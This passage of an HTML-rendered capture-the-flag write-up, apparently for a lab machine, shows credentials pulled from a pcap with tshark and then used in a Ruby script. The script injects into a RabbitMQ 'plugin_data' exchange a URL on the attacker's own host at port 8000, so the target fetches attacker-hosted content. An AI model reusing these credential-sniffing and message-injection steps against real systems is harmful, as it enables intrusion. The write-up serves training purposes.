style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">message = ARGV.empty? ? &#x27;Hello World!&#x27; : ARGV.join(&#x27; &#x27;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">exchange.publish(message)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">puts &quot; [x] Sent #{message}&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">connection.close</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>But when trying to connect we have an access refused, we need credentials.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ruby amqp.rb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">E, [2020-10-01T22:23:44.225632 #116412] ERROR -- #&lt;Bunny::Session:0x460 guest@10.10.10.190:5672, vhost=/, addresses=[10.10.10.190:5672]&gt;: Authentication with RabbitMQ failed: 403 ACCESS_REFUSED - Login was refused using authentication mechanism PLAIN. For details see the broker logfile.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Traceback (most recent call last):</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        2: from amqp.rb:10:in `&lt;main&gt;&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        1: from /home/cyfun/.asdf/installs/ruby/2.7.1/lib/ruby/gems/2.7.0/gems/bunny-2.17.0/lib/bunny/session.rb:325:in `start&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/home/cyfun/.asdf/installs/ruby/2.7.1/lib/ruby/gems/2.7.0/gems/bunny-2.17.0/lib/bunny/session.rb:1216:in `open_connection&#x27;: Authentication with RabbitMQ failed. Please check your connection settings. Username: guest, vhost: /, password length: 5 (Bunny::AuthenticationFailureError</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Since it&#x27;s using PLAIN &quot;cipher&quot; we shoudl be able to see the creds in cleartext
in our pcap.</p><p>So let&#x27;s go with tshark again.</p><p>Reading <a href="https://www.rabbitmq.com/resources/specs/amqp-xml-doc0-9-1.pdf" target="_blank" rel="noopener noreferrer">amqp specs</a>,
we can see that method <code>start-ok</code> (id 11) description is:</p><blockquote><p>select security mechanism and locale</p></blockquote><p>So this filter should help filter <code>start-ok</code> message only:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ tshark -r cyfun.pcap -Y &#x27;amqp.method.method == 11&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Then we can see there are only 4 <a href="https://www.rabbitmq.com/access-control.html#available-mechanisms" target="_blank" rel="noopener noreferrer">Built-in Authentication Mechanisms</a>
including <code>PLAIN</code> and <code>AMQPLAIN</code>.</p><blockquote><p><strong>PLAIN</strong> - SASL PLAIN authentication. This is enabled by default in the RabbitMQ server and clients, and is the default for most other clients.</p><p><strong>AMQPLAIN</strong> - Non-standard version of PLAIN retained for backwards compatibility. This is enabled by default in the RabbitMQ server.</p></blockquote><p>We have nothing filtering with PLAIN so it must use AMQPLAIN.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ tshark -r cyfun.pcap -Y &#x27;amqp.method.method == 11 &amp;&amp; amqp.method.arguments.mechanism == &quot;AMQPLAIN&quot;&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   90  14.547178    127.0.0.1 → 127.0.0.1    AMQP 391 Connection.Start-Ok</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  349 134.658074    127.0.0.1 → 127.0.0.1    AMQP 391 Connection.Start-Ok</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  610 254.771318    127.0.0.1 → 127.0.0.1    AMQP 391 Connection.Start-Ok</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  872 374.913294    127.0.0.1 → 127.0.0.1    AMQP 391 Connection.Start-Ok</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>So now let&#x27;s extract the reponse that should contains the crendtials used to log in.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ tshark -r cyfun.pcap -Y &#x27;amqp.method.method == 11 &amp;&amp; amqp.method.arguments.mechanism == &quot;AMQPLAIN&quot;&#x27; -T fields -e amqp.method.arguments.response | sort -u</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">054c4f47494e530000000679756e74616f0850415353574f5244530000000d45617368416e69634f63334f70</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s decode the hexadecimal manually because <code>xxd -r -p</code> will not display non
printable characters and strip half of what we need.</p><div class="language-ruby codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-ruby codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ irb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">irb(main):001:0&gt; require &#x27;ctf_party&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">=&gt; true</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">irb(main):002:0&gt; &#x27;054c4f47494e530000000679756e74616f0850415353574f5244530000000d45617368416e69634f63334f70&#x27;.from_hex</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">=&gt; &quot;\x05LOGINS\x00\x00\x00\x06yuntao\bPASSWORDS\x00\x00\x00\rEashAnicOc3Op&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We have of course other ways to do:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ rax2 -s 054c4f47494e530000000679756e74616f0850415353574f5244530000000d45617368416e69634f63334f70 | xxd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">00000000: 054c 4f47 494e 5300 0000 0679 756e 7461  .LOGINS....yunta</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">00000010: 6f08 5041 5353 574f 5244 5300 0000 0d45  o.PASSWORDS....E</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">00000020: 6173 6841 6e69 634f 6333 4f70            ashAnicOc3O</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ tshark -r cyfun.pcap -Y &#x27;amqp.method.method == 11 &amp;&amp; amqp.method.arguments.mechanism == &quot;AMQPLAIN&quot;&#x27; -T fields -e amqp.method.arguments.response | sort -u | xxd -r -p | xxd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">00000000: 054c 4f47 494e 5300 0000 0679 756e 7461  .LOGINS....yunta</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">00000010: 6f08 5041 5353 574f 5244 5300 0000 0d45  o.PASSWORDS....E</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">00000020: 6173 6841 6e69 634f 6333 4f70            ashAnicOc3Op</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Anyway we got the AMQP credentials: <code>yuntao:EashAnicOc3Op</code>.</p><p>Let&#x27;s add credentials to our AMQP PoC:</p><div class="language-ruby codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-ruby codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">#!/usr/bin/env ruby</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">require &#x27;bunny&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">options = {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  host: &#x27;10.10.10.190&#x27;,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  port: 5672,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  user: &#x27;yuntao&#x27;,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  password: &#x27;EashAnicOc3Op&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">connection = Bunny.new(options)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">connection.start</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">channel = connection.create_channel</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">exchange = channel.fanout(&#x27;logs&#x27;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">message = ARGV.empty? ? &#x27;Hello World!&#x27; : ARGV.join(&#x27; &#x27;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">exchange.publish(message)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">puts &quot; [x] Sent #{message}&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">connection.close</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Fine this is working now:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ruby amqp.rb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> [x] Sent Hello World!</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Now we need to send our message into <code>plugin_data</code> queue and not <code>logs</code>; and
also to change the message to our downlaod URL.</p><div class="language-ruby codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-ruby codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">#!/usr/bin/env ruby</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">require &#x27;bunny&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">options = {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  host: &#x27;10.10.10.190&#x27;,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  port: 5672,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  user: &#x27;yuntao&#x27;,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  password: &#x27;EashAnicOc3Op&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">connection = Bunny.new(options)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">connection.start</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">channel = connection.create_channel</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">exchange = channel.fanout(&#x27;plugin_data&#x27;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">message = ARGV.empty? ? &#x27;http://10.10.15.36:8000/cyfun.test&#x27; : ARGV.join(&#x27; &#x27;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">exchange.publish(message)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">puts &quot; [x] Sent #{message}&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">connection.close</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>But it an error tells us we are not using the right exchange type.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ruby amqp.rb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Traceback (most recent call last):</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        6: from amqp.rb:15:in `&lt;main&gt;&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        5: from /home/cyfun/.asdf/installs/ruby/2.7.1/lib/ruby/gems/2.7.0/gems/bunny-2.17.0/lib/bunny/channel.rb:316:in `fanout&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        4: from /home/cyfun/.asdf/installs/ruby/2.7.1/lib/ruby/gems/2.7.0/gems/bunny-2.17.0/lib/bunny/channel.rb:316:in `new&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        3: from /home/cyfun/.asdf/installs/ruby/2.7.1/lib/ruby/gems/2.7.0/gems/bunny-2.17.0/lib/bunny/exchange.rb:87:in `initialize&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        2: from /home/cyfun/.asdf/installs/ruby/2.7.1/lib/ruby/gems/2.7.0/gems/bunny-2.17.0/lib/bunny/exchange.rb:254:in `declare!&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        1: from /home/cyfun/.asdf/installs/ruby/2.7.1/lib/ruby/gems/2.7.0/gems/bunny-2.17.0/lib/bunny/channel.rb:1194:in `exchange_declare&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/home/cyfun/.asdf/installs/ruby/2.7.1/lib/ruby/gems/2.7.0/gems/bunny-2.17.0/lib/bunny/channel.rb:1992:in `raise_if_continuation_resulted_in_a_channel_error!&#x27;: PRECONDITION_FAILED - inequivalent arg &#x27;type&#x27; for exchange &#x27;plugin_data&#x27; in vhost &#x27;/&#x27;: received &#x27;fanout&#x27; but current is &#x27;direct&#x27; (Bunny::PreconditionFailed)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s change fanout into direct.</p><div class="language-diff codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-diff codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 85)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 85)">exchange = channel.fanout(&#x27;plugin_data&#x27;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 85)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(80, 250, 123)">+</span><span class="token inserted-sign inserted line" style="color:rgb(80, 250, 123)">exchange = channel.direct(&#x27;plugin_data&#x27;)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Thanks to the very verbose error we know we must have a durable queue.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ruby amqp.rb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Traceback (most recent call last):</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        6: from amqp.rb:15:in `&lt;main&gt;&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        5: from /home/cyfun/.asdf/installs/ruby/2.7.1/lib/ruby/gems/2.7.0/gems/bunny-2.17.0/lib/bunny/channel.rb:334:in `direct&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        4: from /home/cyfun/.asdf/installs/ruby/2.7.1/lib/ruby/gems/2.7.0/gems/bunny-2.17.0/lib/bunny/channel.rb:334:in `new&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        3: from /home/cyfun/.asdf/installs/ruby/2.7.1/lib/ruby/gems/2.7.0/gems/bunny-2.17.0/lib/bunny/exchange.rb:87:in `initialize&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        2: from /home/cyfun/.asdf/installs/ruby/2.7.1/lib/ruby/gems/2.7.0/gems/bunny-2.17.0/lib/bunny/exchange.rb:254:in `declare!&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        1: from /home/cyfun/.asdf/installs/ruby/2.7.1/lib/ruby/gems/2.7.0/gems/bunny-2.17.0/lib/bunny/channel.rb:1194:in `exchange_declare&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/home/cyfun/.asdf/installs/ruby/2.7.1/lib/ruby/gems/2.7.0/gems/bunny-2.17.0/lib/bunny/channel.rb:1992:in `raise_if_continuation_resulted_in_a_channel_error!&#x27;: PRECONDITION_FAILED - inequivalent arg &#x27;durable&#x27; for exchange &#x27;plugin_data&#x27; in vhost &#x27;/&#x27;: received &#x27;false&#x27; but current is &#x27;true&#x27; (Bunny::PreconditionFailed)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s see how we can do that with <a href="https://rdoc.info/github/ruby-amqp/bunny/Bunny/Channel#direct-instance_method" target="_blank" rel="noopener noreferrer">bunny</a>.</p><div class="language-diff codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-diff codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 85)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 85)">exchange = channel.direct(&#x27;plugin_data&#x27;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 85)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(80, 250, 123)">+</span><span class="token inserted-sign inserted line" style="color:rgb(80, 250, 123)">exchange = channel.direct(&#x27;plugin_data&#x27;, durable: true)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Yes! This time it worked.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text 